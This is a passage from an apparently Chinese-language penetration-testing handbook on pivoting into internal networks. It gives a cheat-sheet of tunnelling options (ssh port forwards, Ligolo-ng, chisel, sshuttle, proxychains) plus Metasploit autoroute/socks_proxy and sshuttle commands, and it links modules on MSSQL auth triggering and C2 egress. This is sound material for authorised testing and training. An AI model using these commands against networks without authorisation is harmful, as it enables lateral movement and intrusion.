| 访问单个内网 Web（场景 34） | ssh `-L`（跳板可 SSH） | ligolo 240.0.0.1 / chisel `R:` | 端口别冲突 11601/1080 |
| 整段内网像本地一样访问 | Ligolo-ng 全子网路由 | sshuttle（跳板可 SSH，需 root） | sshuttle 对 ICMP/UDP 支持差 |
| 任意工具走代理 | proxychains + SOCKS（msf socks_proxy / chisel `R:socks` / ssh `-D`） | `proxychains4` 配置加 `socks5 127.0.0.1 1080` | 确认 `/etc/proxychains4.conf` 末尾代理行 |
| 目标主动回连收口（场景 35） | Ligolo `listener_add --to 127.0.0.1:LPORT` | netsh portproxy / ssh `-R` | 接收端永远放目标可达位置 |
| Metasploit 会话内路由 | `post/multi/manage/autoroute` + `auxiliary/server/socks_proxy` | `route`/`route flush` 管理 | SESSION 平台不匹配警告通常无害 |
| 双击穿透（第三层） | Ligolo 第二 tun + `listener_add 0.0.0.0:11601 --to 127.0.0.1:11601` | 递归同法 | 每层一个 tun 接口，别复用 |

Metasploit 速记：
```
msf6 > use post/multi/manage/autoroute      # set SESSION / SUBNET / NETMASK
msf6 > use auxiliary/server/socks_proxy     # set SRVHOST 127.0.0.1 / SRVPORT 1080 / VERSION 4a
```
sshuttle 速记（跳板可 SSH 时，透明访问内网 Web 比 proxychains 稳）：
```bash
sudo sshuttle -v -e "ssh -i id_rsa" -r USER@PIVOT_IP 172.16.X.0/24
# 之后直接 curl http://172.16.X.50:8081/ 无需代理前缀
```

---

## 6. 关联文档

| 文档 | 内容 |
|---|---|
| [00-environment-and-infra](/zh/modules/00-environment-and-infra) | 端口规划（11601/1080/8081…）、日志纪律 |
| [11-mssql](/zh/modules/11-mssql) | 场景 35 的认证触发手段（xp_dirtree 等） |
| [16-ics-calendar](/zh/modules/16-ics-calendar) | 外部触发认证的另一种形态 |
| [09-c2-egress-channels](/zh/modules/09-c2-egress-channels) | 出网通道与"全阶段同路径"原则 |
| `m08-ligolo-ng-setup.sh` 等 | 本模块脚本用法 |
